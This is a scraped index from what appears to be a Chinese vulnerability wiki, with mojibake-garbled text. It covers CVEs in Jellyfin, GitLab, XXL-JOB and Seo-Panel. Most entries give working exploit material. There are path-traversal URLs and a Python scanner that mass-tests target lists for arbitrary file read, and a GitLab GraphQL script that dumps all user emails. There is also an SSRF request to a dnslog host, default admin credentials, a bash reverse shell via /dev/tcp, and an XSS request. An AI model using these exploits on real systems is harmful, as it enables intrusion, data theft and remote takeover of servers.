Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Jellyfin/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Jellyfin/","title":"Jellyfin","keywords":"","body":"Jellyfin Jellyfin ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CVE-2021-21402 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Jellyfin/Jellyfin ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CVE-2021-21402.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Jellyfin/Jellyfin ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CVE-2021-21402.html","title":"Jellyfin ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CVE-2021-21402","keywords":"","body":"Jellyfin ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CVE-2021-21402 ÊºèÊ¥ûÊèèËø∞ JellyfinÊòØ‰∏Ä‰∏™ÂÖçË¥πËΩØ‰ª∂Â™í‰ΩìÁ≥ªÁªü„ÄÇÂú®10.7.1Áâà‰πãÂâçÁöÑJellyfin‰∏≠ÔºåÂ∏¶ÊúâÊüê‰∫õÁªàÁªìÁÇπÁöÑÁ≤æÂøÉËÆæËÆ°ÁöÑËØ∑Ê±ÇÂ∞ÜÂÖÅËÆ∏‰ªéJellyfinÊúçÂä°Âô®ÁöÑÊñá‰ª∂Á≥ªÁªü‰∏≠ËØªÂèñ‰ªªÊÑèÊñá‰ª∂„ÄÇÂΩìWindowsÁî®‰Ωú‰∏ªÊú∫OSÊó∂ÔºåÊ≠§ÈóÆÈ¢òÊõ¥‰∏∫ÊôÆÈÅç„ÄÇÊö¥Èú≤‰∫éÂÖ¨ÂÖ±InternetÁöÑÊúçÂä°Âô®ÂèØËÉΩ‰ºöÂèóÂà∞Â®ÅËÉÅ„ÄÇÂú®ÁâàÊú¨10.7.1‰∏≠Â∑≤‰øÆÂ§çÊ≠§ÈóÆÈ¢ò„ÄÇËß£ÂÜ≥ÊñπÊ≥ïÊòØÔºåÁî®Êà∑ÂèØ‰ª•ÈÄöËøáÂú®Êñá‰ª∂Á≥ªÁªü‰∏äÂÆûÊñΩ‰∏•Ê†ºÁöÑÂÆâÂÖ®ÊùÉÈôêÊù•ÈôêÂà∂Êüê‰∫õËÆøÈóÆÔºå‰ΩÜÊòØÂª∫ËÆÆÂ∞ΩÂø´ËøõË°åÊõ¥Êñ∞„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Jellyfin FOFA [!NOTE] title='Jellyfin' || body='http://jellyfin.media' ÊºèÊ¥ûÂ§çÁé∞ Êó†ËÆ∫ÊòØ/Audio/{Id}/hls/{segmentId}/stream.mp3Âíå/Audio/{Id}/hls/{segmentId}/stream.aacË∑ØÁ∫øÂÖÅËÆ∏‰ªªÊÑèÊñá‰ª∂Âú®Windows‰∏äËØªÂèñ„ÄÇÂèØ‰ª•{segmentId}‰ΩøÁî®WindowsË∑ØÂæÑÂàÜÈöîÁ¨¶\\ÔºàÂØπ%5CURLËøõË°åÁºñÁ†ÅÔºâÂ∞ÜË∑ØÁî±ÁöÑ‰∏ÄÈÉ®ÂàÜËÆæÁΩÆ‰∏∫Áõ∏ÂØπÊàñÁªùÂØπË∑ØÂæÑ„ÄÇÊúÄÂàùÔºåÊîªÂáªËÄÖ‰ºº‰πéÂè™ËÉΩËØªÂèñ‰ª•.mp3Âíå.aacÁªìÂ∞æÁöÑÊñá‰ª∂„ÄÇ‰ΩÜÊòØÔºåÈÄöËøáÂú®URLË∑ØÂæÑ‰∏≠‰ΩøÁî®ÊñúÊù† Path.GetExtension(Request.Path)ËøîÂõû‰∏Ä‰∏™Á©∫Êâ©Â±ïÂêçÔºå‰ªéËÄåËé∑ÂæóÂØπÁªìÊûúÊñá‰ª∂Ë∑ØÂæÑÁöÑÂÆåÂÖ®ÊéßÂà∂„ÄÇÁöÑitemIdÔºåÂõ†‰∏∫ÂÆÉÊ≤°Êúâ‰ΩøÁî®‰πüÊ≤°ÊúâÂÖ≥Á≥ª„ÄÇËØ•ÈóÆÈ¢ò‰∏ç‰ªÖÈôê‰∫éJellyfinÊñá‰ª∂ÔºåÂõ†‰∏∫ÂÆÉÂÖÅËÆ∏‰ªéÊñá‰ª∂Á≥ªÁªüËØªÂèñ‰ªª‰ΩïÊñá‰ª∂„ÄÇ // Can't require authentication just yet due to seeing some requests come from Chrome without full query string // [Authenticated] // [1] [HttpGet(\"Audio/{itemId}/hls/{segmentId}/stream.mp3\", Name = \"GetHlsAudioSegmentLegacyMp3\")] [HttpGet(\"Audio/{itemId}/hls/{segmentId}/stream.aac\", Name = \"GetHlsAudioSegmentLegacyAac\")] //... public ActionResult GetHlsAudioSegmentLegacy([FromRoute, Required] string itemId, [FromRoute, Required] string segmentId) { // TODO: Deprecate with new iOS app var file = segmentId + Path.GetExtension(Request.Path); //[2] file = Path.Combine(_serverConfigurationManager.GetTranscodePath(), file); return FileStreamResponseHelpers.GetStaticFileResult(file, MimeTypes.GetMimeType(file)!, false, HttpContext); } ‰ΩøÁî®Â¶Ç‰∏ãËØ∑Ê±ÇÂ∞Ü‰ºöËØªÂèñÂ∏¶ÊúâÂØÜÁ†ÅÁöÑÊï∞ÊçÆÂ∫ìÊñá‰ª∂ http://xxx.xxx.xxx.xxx /Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/ Âè¶‰∏ÄÂ§Ñ‰ª£Á†ÅÂ¶Ç‰∏ã // Can't require authentication just yet due to seeing some requests come from Chrome without full query string // [Authenticated] //[1] [HttpGet(\"Videos/{itemId}/hls/{playlistId}/{segmentId}.{segmentContainer}\")] //... public ActionResult GetHlsVideoSegmentLegacy( [FromRoute, Required] string itemId, [FromRoute, Required] string playlistId, [FromRoute, Required] string segmentId, [FromRoute, Required] string segmentContainer) { var file = segmentId + Path.GetExtension(Request.Path); //[2] var transcodeFolderPath = _serverConfigurationManager.GetTranscodePath(); file = Path.Combine(transcodeFolderPath, file); //[3] var normalizedPlaylistId = playlistId; var filePaths = _fileSystem.GetFilePaths(transcodeFolderPath); // Add . to start of segment container for future use. segmentContainer = segmentContainer.Insert(0, \".\"); string? playlistPath = null; foreach (var path in filePaths) { var pathExtension = Path.GetExtension(path); if ((string.Equals(pathExtension, segmentContainer, StringComparison.OrdinalIgnoreCase) || string.Equals(pathExtension, \".m3u8\", StringComparison.OrdinalIgnoreCase)) //[4] && path.IndexOf(normalizedPlaylistId, StringComparison.OrdinalIgnoreCase) != -1) //[5] { playlistPath = path; break; } } return playlistPath == null ? NotFound(\"Hls segment not found.\") : GetFileResult(file, playlistPath); } ËØ•/Videos/{Id}/hls/{PlaylistId}/{SegmentId}.{SegmentContainer}Ë∑ØÁî±ÂÖÅËÆ∏Âú®Windows‰∏äËØªÂèñÊú™ÁªèË∫´‰ªΩÈ™åËØÅÁöÑ‰ªªÊÑèÊñá‰ª∂„ÄÇÂèØ‰ª•{SegmentId}.{SegmentContainer}‰ΩøÁî®WindowsË∑ØÂæÑÂàÜÈöîÁ¨¶\\ÔºàÂØπ%5CURLËøõË°åÁºñÁ†ÅÔºâÂ∞ÜË∑ØÁî±ÁöÑ‰∏ÄÈÉ®ÂàÜËÆæÁΩÆ‰∏∫Áõ∏ÂØπÊàñÁªùÂØπË∑ØÂæÑ„ÄÇÂú®SegmentId‰ªéÂíåÊñá‰ª∂Êâ©Â±ïÂêçPathË¢´Á∫ßËÅî„ÄÇÁªìÊûúfileÁî®‰ΩúPath.Combine[3]ÁöÑÁ¨¨‰∫å‰∏™ÂèÇÊï∞„ÄÇ‰ΩÜÊòØÔºåÂ¶ÇÊûúÁ¨¨‰∫å‰∏™ÂèÇÊï∞ÊòØÁªùÂØπË∑ØÂæÑÔºåÂàôÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞toÂ∞ÜPath.CombineË¢´ÂøΩÁï•ÔºåËÄåÂæóÂà∞ÁöÑË∑ØÂæÑ‰ªÖÊòØÁªùÂØπË∑ØÂæÑfile„ÄÇ POCÂ¶Ç‰∏ãÔºå‰∏ãËΩΩÂêåÊ†∑ÁöÑÊñá‰ª∂ http://xxx.xxx.xxx.xxx/Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db Â¶Ç‰∏ä‰∏∫ËØÅÊòéÊºèÊ¥ûÂ≠òÂú®ÂíåÂèØÂà©Áî®ÊÄßÔºåËØ¶ÊÉÖÈìæÊé•ÂèÇËÄÉ https://securitylab.github.com/advisories/GHSL-2021-050-jellyfin/ ÊºèÊ¥ûPOC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Jellyfin >> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=2) if response.status_code == 200 and \"file\" in response.text and \"extension\" in response.text and \"font\" in response.text: print(\"\\033[32m[o] ÁõÆÊ†á {} Â≠òÂú®ÊºèÊ¥û(ËØªÂèñ windows/win.ini), ÈìæÊé•‰∏∫:{} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†á {} ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\".format(target_url)) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÊä•Èîô \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ Jellyfin 10.7.0 Unauthenticated Abritrary File Read CVE-2021-21402 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/GitLab/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/GitLab/","title":"GitLab","keywords":"","body":"GitLab GitLab GraphqlÈÇÆÁÆ±‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2020-26413 GitLab SSRFÊºèÊ¥û CVE-2021-22214 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/GitLab/GitLab GraphqlÈÇÆÁÆ±‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2020-26413.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/GitLab/GitLab GraphqlÈÇÆÁÆ±‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2020-26413.html","title":"GitLab GraphqlÈÇÆÁÆ±‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2020-26413","keywords":"","body":"GitLab GraphqlÈÇÆÁÆ±‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2020-26413 ÊºèÊ¥ûÊèèËø∞ GitLab‰∏≠Â≠òÂú®GraphqlÊé•Âè£ ËæìÂÖ•ÊûÑÈÄ†ÁöÑÊï∞ÊçÆÊó∂‰ºöÊ≥ÑÈú≤Áî®Êà∑ÈÇÆÁÆ±ÂíåÁî®Êà∑Âêç ÊºèÊ¥ûÂΩ±Âìç [!NOTE] GitLab 13.4 - 13.6.2 FOFA [!NOTE] title=\"GitLab\" ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥ûÊù•Ê∫ê‰∏∫ hackone‰∏äÁöÑ‰∏ÄÁØáÂÖ¨ÂºÄÊä•Âëä https://gitlab.com/gitlab-org/gitlab/-/issues/244275 ÊÑèÊÄù‰∏∫ÂΩì‰ΩøÁî®ÊûÑÈÄ†ÁöÑËØ≠Âè•Âú®Êé•Âè£Êü•ËØ¢Êó∂‰ºöËøîÂõûÈÇÆÁÆ±‰ø°ÊÅØÔºåÂ¶ÇÂõæ ËÆøÈóÆ URL http://xxx.xxx.xxx.xxx/-//graphql-explorer GitlabÊú¨Ë∫´‰∏çÂÖÅËÆ∏Ëé∑ÂèñË¥¶Âè∑ÈÇÆÁÆ±‰ø°ÊÅØÔºåËøôÈáåÈÄöËøáË∞ÉÁî® Graphql Áî®Êà∑ÂêçÊü•ËØ¢ÈÄ†Êàê‰∫ÜÈÇÆÁÆ±Ê≥ÑÈú≤ÊºèÊ¥û Êü•ÁúãÂÆåÊä•ÂëäÂêéÂèëÁé∞ÊºèÊ¥ûÂà©Áî®ÈúÄË¶ÅÊúâË¥¶Âè∑Áî®Êà∑ÂêçÔºåÂú®‰∏çÁü•ÈÅìÁöÑÊÉÖÂÜµ‰∏ãÊó†Ê≥ïËé∑ÂèñÈÇÆÁÆ±ÔºåÂú®GraphqlÂÆòÁΩëÊü•ÁúãÂæóÁü•ÂèØ‰ª•ÈÄöËøáÂè¶‰∏Ä‰∏™ÊûÑÈÄ†ÁöÑËØ≠Âè•‰∏ÄÊ¨°ÊÄßËøîÂõûÊâÄÊúâÁöÑÁî®Êà∑ÂêçÂíåÈÇÆÁÆ± ÂèëÂåÖË∞ÉÁî®‰∫Ü /api/graphql Êé•Âè£ÂèëÈÄÅÊï∞ÊçÆ ÂÆåÊï¥Êï∞ÊçÆÂåÖ‰∏∫ POST /api/graphql HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 212 Content-Type: application/json {\"query\":\"{\\nusers {\\nedges {\\n node {\\n username\\n email\\n avatarUrl\\n status {\\n emoji\\n message\\n messageHtml\\n }\\n }\\n }\\n }\\n }\",\"variables\":null,\"operationName\":null} ÊàêÂäüËøîÂõûÊï∞ÊçÆÔºåÈÄ†Êàê GitlabÁöÑÁî®Êà∑ÈÇÆÁÆ±‰ø°ÊÅØÊ≥ÑÈú≤ ÊºèÊ¥ûÂà©Áî®POC import requests import sys import random import re import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: GitLab 13.4 - 13.6.2 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/api/graphql\" user_number = 0 headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/json\", } try: data = \"\"\" {\"query\":\"{\\\\nusers {\\\\nedges {\\\\n node {\\\\n username\\\\n email\\\\n avatarUrl\\\\n status {\\\\n emoji\\\\n message\\\\n messageHtml\\\\n }\\\\n }\\\\n }\\\\n }\\\\n }\",\"variables\":null,\"operationName\":null} \"\"\" requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data ,verify=False, timeout=5) if \"email\" in response.text and \"username\" in response.text and \"@\" in response.text and response.status_code == 200: print('\\033[32m[o] ÁõÆÊ†á{}Â≠òÂú®ÊºèÊ¥û, Ê≥ÑÈú≤Áî®Êà∑ÈÇÆÁÆ±Êï∞ÊçÆ....... \\033[0m'.format(target_url)) for i in range(0,999): try: username = json.loads(response.text)[\"data\"][\"users\"][\"edges\"][i][\"node\"][\"username\"] email = json.loads(response.text)[\"data\"][\"users\"][\"edges\"][i][\"node\"][\"email\"] user_number = user_number + 1 print('\\033[34m[o] Áî®Êà∑Âêç:{} ÈÇÆÁÆ±:{} \\033[0m'.format(username, email)) except: print(\"\\033[32m[o] ÂÖ±Ê≥ÑÈú≤{}ÂêçÁî®Êà∑ÈÇÆÁÆ±Ë¥¶Âè∑ \\033[0m\".format(user_number)) sys.exit(0) else: print(\"\\033[31m[x] ‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ GitLab_Graphql_Email_information_disclosure.json Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/GitLab/GitLab SSRFÊºèÊ¥û CVE-2021-22214.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/GitLab/GitLab SSRFÊºèÊ¥û CVE-2021-22214.html","title":"GitLab SSRFÊºèÊ¥û CVE-2021-22214","keywords":"","body":"GitLab SSRFÊºèÊ¥û CVE-2021-22214 ÊºèÊ¥ûÊèèËø∞ GitLabÂ≠òÂú®ÂâçÂè∞Êú™ÊéàÊùÉSSRFÊºèÊ¥ûÔºåÊú™ÊéàÊùÉÁöÑÊîªÂáªËÄÖ‰πüÂèØ‰ª•Âà©Áî®ËØ•ÊºèÊ¥ûÊâßË°åSSRFÊîªÂáªÔºàCVE-2021-22214Ôºâ„ÄÇËØ•ÊºèÊ¥ûÊ∫ê‰∫éÂØπÁî®Êà∑Êèê‰æõÊï∞ÊçÆÁöÑÈ™åËØÅ‰∏çË∂≥ÔºåËøúÁ®ãÊîªÂáªËÄÖÂèØÈÄöËøáÂèëÈÄÅÁâπÊÆäÊûÑÈÄ†ÁöÑ HTTP ËØ∑Ê±ÇÔºåÊ¨∫È™óÂ∫îÁî®Á®ãÂ∫èÂêë‰ªªÊÑèÁ≥ªÁªüÂèëËµ∑ËØ∑Ê±Ç„ÄÇÊîªÂáªËÄÖÊàêÂäüÂà©Áî®ËØ•ÊºèÊ¥ûÂèØËé∑ÂæóÊïèÊÑüÊï∞ÊçÆÁöÑËÆøÈóÆÊùÉÈôêÊàñÂêëÂÖ∂‰ªñÊúçÂä°Âô®ÂèëÈÄÅÊÅ∂ÊÑèËØ∑Ê±Ç„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Gitlab > 10.5 FOFA [!NOTE] app=\"GitLab\" ÁéØÂ¢ÉÊê≠Âª∫ http://vulfocus.fofa.so/ ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÂèëÈÄÅËØ∑Ê±ÇÂåÖ POST /api/v4/ci/lint HTTP/1.1 Host: User-Agent: python-requests/2.25.0 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Type: application/json Content-Length: 111 {\"include_merged_yaml\": true, \"content\": \"include:\\n remote: http://965qaw.dnslog.cn/api/v1/targets?test.yml\"} Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/XXL-JOB/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/XXL-JOB/","title":"XXL-JOB","keywords":"","body":"XXL-JOB XXL-JOB ‰ªªÂä°Ë∞ÉÂ∫¶‰∏≠ÂøÉ ÂêéÂè∞ÈªòËÆ§Âº±Âè£‰ª§ XXL-JOB ‰ªªÂä°Ë∞ÉÂ∫¶‰∏≠ÂøÉ ÂêéÂè∞‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/XXL-JOB/XXL-JOB ‰ªªÂä°Ë∞ÉÂ∫¶‰∏≠ÂøÉ ÂêéÂè∞ÈªòËÆ§Âº±Âè£‰ª§.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/XXL-JOB/XXL-JOB ‰ªªÂä°Ë∞ÉÂ∫¶‰∏≠ÂøÉ ÂêéÂè∞ÈªòËÆ§Âº±Âè£‰ª§.html","title":"XXL-JOB ‰ªªÂä°Ë∞ÉÂ∫¶‰∏≠ÂøÉ ÂêéÂè∞ÈªòËÆ§Âº±Âè£‰ª§","keywords":"","body":"XXL-JOB ‰ªªÂä°Ë∞ÉÂ∫¶‰∏≠ÂøÉ ÂêéÂè∞ÈªòËÆ§Âº±Âè£‰ª§ ÊºèÊ¥ûÊèèËø∞ XXL-JOB ‰ªªÂä°Ë∞ÉÂ∫¶‰∏≠ÂøÉ ÂêéÂè∞Â≠òÂú®ÈªòËÆ§Âº±Âè£‰ª§ÔºåÊîªÂáªËÄÖÂèØ‰ª•Âú®ÂêéÂè∞Ëøõ‰∏ÄÊ≠•ÊîªÂáª ÊºèÊ¥ûÂΩ±Âìç [!NOTE] XXL-JOB FOFA [!NOTE] app=\"XXL-JOB\" || title=\"‰ªªÂä°Ë∞ÉÂ∫¶‰∏≠ÂøÉ\" ÊºèÊ¥ûÂ§çÁé∞ ‰ΩøÁî®ÈªòËÆ§Âè£‰ª§ÁôªÂΩï admin 123456 Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ XXL_JOB_Default_password Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/XXL-JOB/XXL-JOB ‰ªªÂä°Ë∞ÉÂ∫¶‰∏≠ÂøÉ ÂêéÂè∞‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/XXL-JOB/XXL-JOB ‰ªªÂä°Ë∞ÉÂ∫¶‰∏≠ÂøÉ ÂêéÂè∞‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"XXL-JOB ‰ªªÂä°Ë∞ÉÂ∫¶‰∏≠ÂøÉ ÂêéÂè∞‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"XXL-JOB ‰ªªÂä°Ë∞ÉÂ∫¶‰∏≠ÂøÉ ÂêéÂè∞‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ XXL-JOB ‰ªªÂä°Ë∞ÉÂ∫¶‰∏≠ÂøÉÊîªÂáªËÄÖÂèØ‰ª•Âú®ÂêéÂè∞ÂèØ‰ª•ÈÄöËøáÂÜôÂÖ•shellÂëΩ‰ª§‰ªªÂä°Ë∞ÉÂ∫¶Ëé∑ÂèñÊúçÂä°Âô®ÊùÉÈôê ÊºèÊ¥ûÂΩ±Âìç [!NOTE] XXL-JOB FOFA [!NOTE] app=\"XXL-JOB\" || title=\"‰ªªÂä°Ë∞ÉÂ∫¶‰∏≠ÂøÉ\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÂêéÂè∞Â¢ûÂä†‰∏Ä‰∏™‰ªªÂä° [!NOTE] Ê≥®ÊÑèËøêË°åÊ®°ÂºèÈúÄË¶Å‰∏∫ GLUE(shell) ÁÇπÂáª GLUE IDEÁºñËæëËÑöÊú¨ ÊâßË°åÊé¢ÊµãÂá∫ÁΩëÔºåÂíå‰ªªÂä°Ë∞ÉÁî®ÊòØÂê¶ÂèØÊâßË°å ÂèçÂºπ‰∏Ä‰∏™shell #!/bin/bash bash -c 'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/9999 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Seo-Panel/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Seo-Panel/","title":"Seo-Panel","keywords":"","body":"Seo-Panel Seo-Panel 4.8.0 ÂèçÂ∞ÑÂûãXSSÊºèÊ¥û CVE-2021-3002 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Seo-Panel/Seo-Panel 4.8.0 ÂèçÂ∞ÑÂûãXSSÊºèÊ¥û  CVE-2021-3002.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Seo-Panel/Seo-Panel 4.8.0 ÂèçÂ∞ÑÂûãXSSÊºèÊ¥û  CVE-2021-3002.html","title":"Seo-Panel 4.8.0 ÂèçÂ∞ÑÂûãXSSÊºèÊ¥û  CVE-2021-3002","keywords":"","body":"Seo-Panel 4.8.0 ÂèçÂ∞ÑÂûãXSSÊºèÊ¥û CVE-2021-3002 ÊºèÊ¥ûÊèèËø∞ Seo PanelÊòØ‰∏Ä‰∏™ÁΩëÁ´ôÊêúÁ¥¢ÂºïÊìé‰ºòÂåñÁÆ°ÁêÜÁöÑÂÆåÊï¥ÊéßÂà∂Èù¢Êùø„ÄÇÂÆÉÂåÖÂê´‰∫ÜÂ§ö‰∏™SEOÂ∑•ÂÖ∑Êù•Â¢ûÂä†ÂíåË∑üË∏™‰Ω†ÁöÑÁΩëÁ´ôÊÄßËÉΩ Seo-Panel 4.8.0‰ª•‰∏ãÁâàÊú¨Â≠òÂú®ËøáÊª§‰∏çÂÆåÂÖ®ÁöÑÊÉÖÂÜµÔºåÈÄ†ÊàêÂ≠òÂú® ÂèçÂ∞ÑÂûãXSSÊºèÊ¥û ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Seo-Panel Version ÁéØÂ¢ÉÊê≠Âª∫ https://github.com/seopanel/Seo-Panel ‰∏ãËΩΩÂêéÊîæÂÖ•ÁΩëÁ´ôÊ†πÁõÆÂΩïÊ†πÊçÆÊèêÁ§∫ÂÆâË£ÖËÆøÈóÆÂç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥ûÂá∫Áé∞Âú®ÊâæÂõûÂØÜÁ†ÅÈ°µÈù¢ http://xxx.xxx.xxx.xxx/login.php?sec=forgot ÊàêÂäüÂºπÁ™ó ,ÈÄ†Êàê ÂèçÂ∞ÑÂûãXSS ÊºèÊ¥û ÊºèÊ¥ûPOC ËØ∑Ê±ÇÂåÖÂ¶Ç‰∏ã POST /login.php?sec=forgot HTTP/1.1 Host: 192.168.51.133 Content-Length: 118 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Origin: http://192.168.51.133 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://192.168.51.133/login.php?sec=forgot Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=i0qk20ehq89b29ct8krpv76vn3; yzmphp_adminid=33d5DywYQIUGS13SI7x4I0y7JiCacraGcDU1uoBx; 